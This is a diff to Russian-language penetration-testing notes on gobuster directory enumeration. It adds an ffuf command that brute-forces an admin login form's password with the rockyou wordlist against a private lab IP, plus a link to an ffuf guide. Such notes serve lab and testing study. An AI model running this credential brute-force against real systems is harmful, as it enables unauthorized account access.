@@ -15,7 +15,14 @@ gobuster dir -u http://172.23.212.251/files -w /usr/share/wordlists/dirbuster/di
                                                                                                                                                                                                 |
 .txt, .php, .html, .zip                                                                                                                                                                         |
 Здесь -u – URL или IP-адрес сайта, -w – словарь, -t – количество потоков, -x – расширения файлов и -s – ответы сервера, которые будут отображаться.                                             |
-перебор файлов                                                                                                                                                                                  |
+перебор файлов 
+
+
+
+
+
+Можно сделать перебор паролей вот так тоже через ffuf, так же краткий экскурс по ffuf https://cisoclub.ru/rukovodstvo-po-fuzz-faster-u-fool-ffuf/
+ffuf -u "http://172.23.118.28" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "login=admin&passwd=WFUZZ" -w /usr/share/wordlists/rockyou.txt:WFUZZ -c -fs 14 -t 500 -mc 302 -H "HOST: localhost"
                                                                                                                                                                                                 |
 /usr/share/wordlists/dirbuster/ где лежат переборы                                                                                                                                              |
                                                                                                                                                                                                 |
